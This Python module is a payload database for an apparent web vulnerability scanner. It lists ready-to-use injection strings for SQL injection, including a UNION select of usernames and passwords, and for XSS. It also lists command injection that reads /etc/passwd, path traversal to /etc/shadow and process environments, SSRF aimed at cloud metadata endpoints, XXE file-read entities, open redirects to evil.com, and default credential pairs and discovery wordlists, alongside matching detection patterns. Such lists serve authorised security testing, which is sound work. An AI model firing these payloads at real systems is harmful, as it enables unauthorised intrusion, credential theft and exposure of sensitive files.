"""
Payload database for various vulnerability types.
Contains injection payloads for SQLi, XSS, command injection, LFI, SSRF, etc.
"""

# SQL Injection payloads
SQLI_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "admin'--",
    "admin' OR '1'='1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' AND 1=1 --",
    "' AND 1=2 --",
    "1' AND SLEEP(5)--",
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1; SELECT pg_sleep(5)--",
    "' OR '1'='1' AND SLEEP(5)--",
    "\" OR \"\"=\"",
    "%27 OR %271%27=%271",
    "1' OR '1'='1' UNION SELECT username,password FROM users--",
]

# Error-based SQLi patterns
SQLI_ERROR_PATTERNS = [
    "sql syntax",
    "mysql_fetch",
    "ORA-",
    "oracle error",
    "Microsoft OLE DB Provider for SQL Server",
    "ODBC SQL Server Driver",
    "SQLSTATE",
    "SQLServer JDBC Driver",
    "PostgreSQL ERROR",
    "Warning: pg_",
    "Warning: mysql_",
    "mysqli_",
    "You have an error in your SQL syntax",
    "Incorrect syntax near",
    "Unclosed quotation mark",
    "SQLite3::query",
    "Warning: sqlite",
    "PG::Error",
    "Mysql2::Error",
    "ORA-00936",
    "ORA-00942",
]

# XSS payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<svg onload=alert('XSS')>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<IMG SRC=javascript:alert('XSS')>",
    "<script>document.cookie</script>",
    "<a href=javascript:alert(1)>click</a>",
    "\";alert(1);//",
    "<marquee onstart=alert(1)>",
    "<style onload=alert(1)>",
    "<form><button formaction=javascript:alert(1)>X</button></form>",
]

# Command injection payloads
CMD_INJECTION_PAYLOADS = [
    ";id",
    "|id",
    "`id`",
    "$(id)",
    "&&id",
    "||id",
    ";id;",
    "| id",
    ";cat /etc/passwd",
    "|cat /etc/passwd",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",
    "& whoami",
    ";whoami",
    "|whoami",
    ";uname -a",
    "|uname -a",
    "%0aid",
    "%0a%0did",
    ";ping -c 5 127.0.0.1",
    "|ping -n 5 127.0.0.1",
]

# Command injection detection patterns
CMD_INJECTION_PATTERNS = [
    "uid=",
    "root:",
    "bin/bash",
    "bin/sh",
    "www-data",
    "daemon:",
    "/bin/",
    "Linux",
    "Darwin",
    "groups=",
    "context=",
]

# LFI / Path Traversal payloads
LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%2fpasswd",
    "/etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "C:\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "/proc/self/environ",
    "/proc/self/fd/0",
    "/var/log/apache2/access.log",
    "/var/log/httpd/access_log",
    "../../../etc/shadow",
    "../../../../boot/grub/grub.cfg",
]

# LFI detection patterns
LFI_PATTERNS = [
    "root:x:",
    "[extensions]",
    "[fonts]",
    "[files]",
    "daemon:",
    "bin:",
    "www-data:",
    "PATH=",
    "GATEWAY_INTERFACE=",
]

# SSRF payloads
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://127.0.0.1:80",
    "http://127.0.0.1:22",
    "http://127.0.0.1:443",
    "http://[::1]",
    "http://0.0.0.0",
    "http://0x7f000001",
    "http://2130706433",
    "http://127.1",
    "http://0",
    "http://127.0.0.1.nip.io",
    "http://localtest.me",
    "dict://127.0.0.1:11211",
    "gopher://127.0.0.1:6379/_INFO",
    "file:///etc/passwd",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.azure.com/metadata/instance?api-version=2021-02-01",
]

# XXE payloads
XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1/xxe.dtd"> %xxe;]>',
    '<?xml version="1.0"?><!DOCTYPE replace [<!ENTITY name "xxe">]><root>&name;</root>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///dev/null"> %xxe;]><test/>',
]

# XXE detection patterns
XXE_PATTERNS = [
    "root:x:",
    "[extensions]",
    "daemon:",
    "bin:",
    "[fonts]",
    "[files]",
]

# IDOR - common ID patterns to test
IDOR_ID_PATTERNS = [
    "1", "2", "3", "100", "999", "1000", "-1", "0",
    "0001", "0002", "admin", "root", "test",
]

# Open redirect payloads
OPEN_REDIRECT_PAYLOADS = [
    "//google.com",
    "https://google.com",
    "//evil.com",
    "https://evil.com",
    "//google.com@evil.com",
    "/redirect?url=https://evil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "https:google.com",
    "///google.com",
]

# Common directory paths for bruteforce
DIRECTORY_WORDLIST = [
    "admin", "administrator", "login", "wp-admin", "wp-login",
    "phpmyadmin", "cpanel", "dashboard", "config", "backup",
    "test", "debug", "api", "v1", "v2", "rest", "graphql",
    "uploads", "files", "data", "database", "db",
    "tmp", "temp", "cache", "logs", "log",
    ".git", ".env", ".svn", ".htaccess", ".htpasswd",
    "robots.txt", "sitemap.xml", "crossdomain.xml",
    "web.config", "package.json", "composer.json",
    "old", "new", "dev", "development", "staging", "stage",
    "demo", "beta", "alpha", "preview", "draft",
    "secret", "private", "internal", "hidden", "secure",
    "backup.zip", "backup.tar.gz", "backup.sql", "dump.sql",
    ".DS_Store", "Thumbs.db", "error_log", "access.log",
    "node_modules", "vendor", "dist", "build",
    "swagger", "swagger-ui", "api-docs", "openapi.json",
    "actuator", "actuator/health", "actuator/env",
    "health", "status", "ping", "info",
    "console", "shell", "terminal", "cmd",
    "phpinfo.php", "info.php", "test.php",
    "install", "setup", "wizard",
    "user", "users", "profile", "account",
    "upload", "download", "export", "import",
    "search", "find", "query",
    "feed", "rss", "atom",
    "sitemap", "robots", "security",
]

# Default credentials - username:password pairs
DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "root"),
    ("admin", "administrator"),
    ("root", "root"),
    ("root", "toor"),
    ("root", "password"),
    ("root", "admin"),
    ("test", "test"),
    ("test", "password"),
    ("guest", "guest"),
    ("user", "user"),
    ("user", "password"),
    ("administrator", "administrator"),
    ("administrator", "password"),
    ("sa", "sa"),
    ("sa", "password"),
    ("postgres", "postgres"),
    ("postgres", "password"),
    ("mysql", "mysql"),
    ("mysql", "root"),
    ("ftp", "ftp"),
    ("oracle", "oracle"),
    ("oracle", "password"),
]

# Common subdomain prefixes for enumeration
SUBDOMAIN_PREFIXES = [
    "www", "mail", "ftp", "smtp", "pop", "imap",
    "admin", "blog", "dev", "staging", "test", "beta",
    "api", "app", "portal", "secure", "vpn",
    "ns1", "ns2", "dns", "dns1", "dns2",
    "m", "mobile", "shop", "store", "remote",
    "cloud", "webmail", "web", "git", "gitlab",
    "jenkins", "ci", "cd", "build", "deploy",
    "monitor", "status", "grafana", "prometheus",
    "db", "database", "redis", "elastic", "search",
    "s3", "storage", "files", "cdn", "static",
    "assets", "media", "img", "images",
    "support", "help", "docs", "wiki",
    "internal", "intranet", "private", "office",
    "ldap", "ad", "sso", "auth", "login",
    "sandbox", "preview", "demo", "qa",
    "backup", "bak", "old", "new",
    "production", "prod", "staging", "stage",
]
